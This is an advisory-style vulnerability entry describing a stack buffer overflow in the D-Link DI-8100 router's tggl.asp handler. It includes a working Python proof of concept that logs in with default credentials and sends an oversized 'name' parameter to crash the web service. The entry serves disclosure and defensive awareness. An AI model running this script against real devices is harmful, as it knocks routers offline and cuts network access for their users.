
# VULDB ENTRY: DI-8100 Router tggl_asp strcat Buffer Overflow

Vendor               : D-Link Corporation

Affected Versions    : Firmware version 16.07.26A1 

Component            : Web Management Interface (tggl.asp / tggl_asp function)

Vulnerability Type   : Stack-based Buffer Overflow (CWE-121)


## SUMMARY
The D-Link DI-8100 router firmware version 16.07.26A1 contains a stack-based buffer overflow vulnerability in the `tggl_asp` function, which handles HTTP requests to `/tggl.asp`. The vulnerability is triggered via an overly long `name` parameter when the `opt=add` action is performed.

Due to the use of unbounded `sprintf` and `strcat` operations on a fixed-size stack buffer (10240 bytes), a remote authenticated attacker can cause a denial-of-service condition (httpd crash) or potentially achieve remote code execution on the underlying MIPS-based system.


## VULNERABILITY DETAILS

<img width="2173" height="913" alt="image" src="https://github.com/user-attachments/assets/a843bb19-f27b-4626-9429-87b4df1e2173" />

<img width="2042" height="868" alt="image" src="https://github.com/user-attachments/assets/6ac67985-6c97-452a-812e-203f3d0afb91" />


## PROOF OF CONCEPT (PoC)
```python

import requests

TARGET = "192.168.0.1"
BASE_URL = f"http://{TARGET}"
USER, PASS = "admin", "admin"

s = requests.Session()
s.verify = False

# 登录
s.post(f"{BASE_URL}/login.cgi", data={"user": USER, "password": PASS}, timeout=5)

# 发送超长 name 参数（12000 字节）
payload = "A" * 12000
try:
    s.get(f"{BASE_URL}/tggl.asp",
          params={"opt": "add", "name": payload, "en": "0", "log": "0", "tdata": "test"},
          timeout=5)
except:
    pass  # 预期连接被重置或超时


try:
    s.get(f"{BASE_URL}/tggl.asp",
          params={"opt": "add", "name": "check", "en": "0", "log": "0", "tdata": "test"},
          timeout=3)
    print("[!] Service still alive")
except:
    print("[+] Service crashed - vulnerability confirmed")
```

**Expected Result:**

<img width="2235" height="341" alt="image" src="https://github.com/user-attachments/assets/0dc2b28c-86c7-49f2-b1c7-6f3e873daa0a" />


## IMPACT

**Denial of Service (DoS):** Remote attackers can repeatedly crash the web management service, rendering the router's administrative interface  inaccessible. Under certain conditions, the entire device may reboot,disrupting network connectivity for all users.

